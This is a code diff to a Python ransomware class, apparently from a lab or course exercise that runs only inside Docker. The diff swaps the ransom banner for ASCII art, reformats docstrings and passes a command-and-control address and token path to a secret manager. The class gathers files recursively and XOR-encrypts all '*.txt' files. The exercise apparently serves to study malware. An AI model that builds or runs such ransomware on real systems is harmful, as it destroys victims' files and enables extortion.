@@ -10,19 +10,42 @@ CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
 ENCRYPT_MESSAGE = """
-   ________  ____________________________  __   ____
-  / ____/ / / / ____/ ____/ ____/ ____/ / / /  / / /
- / /   / /_/ / __/ / __/ / __/ / __/ / /_/ /  / / /
-/ /___/ __  / /___/ /___/ /___/ /___/ __  /  /_/_/
-\____/_/ /_/_____/_____/_____/_____/_/ /_/  /_/_/
-           
+                               _.._      _
+                              (\\   `-../\' `\\
+                     _..--..__|_)      )   )`-.
+                    (_       |  |     /   |    `-..,,
+                    | )      |  |    (   ,'         )
+                    |,\'\\     (  (    \'  (          ,'
+               __..-\'   \\     )  )      |         ,\\.__
+              `\\         \\    `. `.     )        ,\'    ``--,
+                `\\        \\    )  )    (        ,\'        /
+                  `\\_      |   (  (    |       (        ,\'\"Y8a,_
+              __,,ad8b,    (   `. `.   |      ,\'     _,'     `""Y8a,_
+      __,,aad8P\"\"\'\' _,8b    )   )  )   |     ,\'   _,d88b          `\"\"Y8a
+_,aad8P\"\"\'\'       ,d8888b   )   (  (   (    (  ,d8888P\"\'    __,,aadd8PP8
+8\"Y8b,_           `Y888888a,(,,,,),,),aabaaadgd8PP\"\'__,,aadd8PP\"\"\'\'    8
+8   \"\"Y8a,_          ``\"\"YYYYY88888PPPP\"\"\"\'\'__,,aadd8PP\"\"\'\'            8
+8       \"\"Y8a,_                     __,,aadd8PP\"\"\'\'                    8
+8           \"\"\\Y8a,_         __,,aadd8PP\"\"\'\'                            8
+8               \"\"Y8a,,,aadd8PP\"\"\'\'                                    8
+8                   \"8P\"\"\'\'                                           _8
+8                    8                                         _,,aadd88
+8b,_                 8                                  _,,aadd88888888P
+8888ba,              8                           _,,aadd88888888PP\"\"\'\'
+ `"Y8888b,_          8                    _,,aadd88888888PP\"\"\'\'
+    `"Y8888ba,       8             _,,aadd88888888PP\"\"\'\'
+       `"Y88888b,_   8      _,,aadd88888888PP\"\"\'\'
+           ""88888ba,8,,aadd88888888PP\"\"\'\'
+              `"Y888888888888PP\"\"\'\'
+                 `\"Y88PP\"\"\'\'
+                     \"
 """
 
 class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
-        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+        self._secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
 
 
     def check_hostname_is_docker(self) -> None:
@@ -36,15 +59,12 @@ class Ransomware:
 
     def get_files(self, filter:str) -> list:
         # return all files matching the filter
-        """
-        In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
-        The paths are stored as PosixPath objects of their string equivalent.
-        """
+        """In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
+        The paths are stored as PosixPath objects of their string equivalent."""
         # files_list = list(Path().rglob(filter))
-        """
-        In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
-        The paths are stored as strings.
-        """
+        """In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
+        The paths are stored as strings."""
+
         files_list = [str(p) for p in list(Path().rglob(filter))]
 
         return files_list
@@ -70,8 +90,6 @@ class Ransomware:
         self._secret_manager.xorfiles(self.get_files("*.txt"))
 
 if __name__ == "__main__":
-    print(sys.argv)
-
     if "--verbose" in sys.argv:
         logging.basicConfig(level=logging.DEBUG)
     else:
